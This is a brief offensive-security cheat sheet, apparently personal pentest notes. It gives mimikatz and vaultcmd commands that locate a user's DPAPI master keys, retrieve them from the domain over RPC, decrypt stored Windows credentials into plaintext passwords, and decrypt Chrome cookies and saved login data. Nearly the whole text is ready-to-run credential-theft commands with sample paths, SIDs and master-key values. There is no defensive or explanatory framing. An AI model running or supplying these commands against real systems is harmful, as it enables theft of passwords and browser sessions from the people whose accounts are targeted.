### DPAPI
The MasterKey information is stored in C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<user sid> 
The next step is to retrieve the actual MasterKey from the Domain 
```
shell vaultcmd /listcreds:"Windows Credentials" /all
mimikatz !sekurlsa::dpapi

ls C:\Users\NyaMeeEain\AppData\Roaming\Microsoft\Protect
ls C:\Users\NyaMeeEain\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132

mimikatz dpapi::masterkey /in:C:\Users\NyaMeeEain\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132\dd536ce3-5253-496a-a699-03b9f5d86d34 /rpc
mimikatz dpapi::masterkey /in:C:\Users\NyaMeeEain\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132\fcf4f725-0947-4180-a924-bc9da9ed8910 /rpc

```
Upong Obtianing The Correct The Materkey, final Step is to obtain The Pain Text Password.
```

mimikatz dpapi::cred /in:C:\Users\NyaMeeEain\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758 /masterkey:2b9b298b073b07ec368cc7e440e00dcb3e42db2644a73f729fc7555d3064201d04d0cc613afbb6c5e304b5d4f290c565a77248db32401b3264ac6103261a9c1b
mimikatz dpapi::cred /in:C:\Users\NyaMeeEain\AppData\Local\Microsoft\Credentials\CEB02D292305299EAF4AAC14CDDAA067 @masterkey:b72f8f914416c21f107513c7b49fdea79bfab318891171891d09c552b435c88cb3e56406a5f54d99c74e5ca78d5bc3895231fd215f2e55e72583c30156431996
```
### Chrome
```
dpapi::chrome /in:"C:\Users\NyaMeeEain\AppData\Local\Google\Chrome\User Data\Default\Cookies"
dpapi::chrome /in:"C:\Users\NyaMeeEain\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

```
